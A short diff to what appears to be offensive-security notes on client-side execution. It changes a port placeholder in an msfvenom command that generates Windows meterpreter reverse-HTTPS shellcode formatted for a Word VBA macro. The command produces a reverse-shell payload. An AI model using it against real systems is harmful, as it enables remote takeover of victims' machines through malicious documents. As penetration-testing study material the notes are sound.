@@ -7,7 +7,7 @@ parent: Client Side Execution
 First prepare the shellcode:
 
 ```
-msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=3333 EXITFUNC=thread -f vbapplication
+msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f vbapplication
 ```
 
 Next in Microsoft Word do this:
